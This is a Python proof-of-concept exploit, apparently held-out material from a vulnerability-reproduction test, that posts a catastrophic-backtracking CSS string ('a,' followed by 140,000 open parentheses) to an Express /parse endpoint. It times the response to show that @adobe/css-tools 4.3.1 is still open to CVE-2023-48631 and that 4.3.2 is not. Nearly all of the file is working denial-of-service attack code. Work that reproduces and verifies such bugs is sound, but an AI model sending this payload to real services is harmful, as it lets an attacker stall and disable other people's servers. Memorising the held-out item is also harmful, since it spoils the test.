#!/usr/bin/env python3
"""[HELD-OUT] bypass_poc — CVE-2023-48631 residual exploit, delivered over EXTERNAL HTTP.

Sends the CVE-2023-48631 catastrophic CSS string to the REAL Express service (POST /parse) and
measures the server-side response latency. The payload `a,` + `(`*N + `{}` has a comma, which forces
`selector()` to run its comma-split regex `/("|')(?:\\1|.)*?\\1|\\(.*?\\)/g`; the `|\\(.*?\\)` branch
against a long unmatched-'(' run costs O(n^2) (each '(' restarts a `.*?)` scan to end-of-string).

@adobe/css-tools@4.3.1 (the CVE-2023-26364 fix, TARGET) NEVER touched this selector regex, so the
residual is STILL catastrophic on V1 -- the CVE-2023-26364 fix is INCOMPLETE (sibling-regex).

Expected: SLOW (response hangs) on V1 (4.3.1); FAST/bounded on V2 (4.3.2), where CVE-2023-48631
removes the `|\\(.*?\\)` branch and handles parentheses with an explicit non-regex
findClosingParenthese() scan. Also SLOW on V0 (4.3.0) -- expected, since the selector regex is
IDENTICAL on V0 and V1 (CVE-2023-26364 only changed the @import / comment regexes).

Usage: bypass_poc.py http://127.0.0.1:26365
"""
import http.client
import json
import socket
import sys
import time

PAYLOAD = "a," + "(" * 140000 + "{}"   # len 140004
HTTP_TIMEOUT_S = 10.0


def run(base_url: str) -> dict:
    host, port = base_url.replace("http://", "").split(":")
    body = json.dumps({"css": PAYLOAD})
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/parse", body=body,
                  headers={"Content-Type": "application/json"})
        r = c.getresponse()
        resp = r.read().decode("utf-8", "replace")
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": False, "resp": resp[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": True, "resp": None}


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:26365"
    out = run(base)
    print(json.dumps({"poc": "residual/CVE-2023-48631", "payload_len": len(PAYLOAD),
                      "target": base, **out}, indent=2))
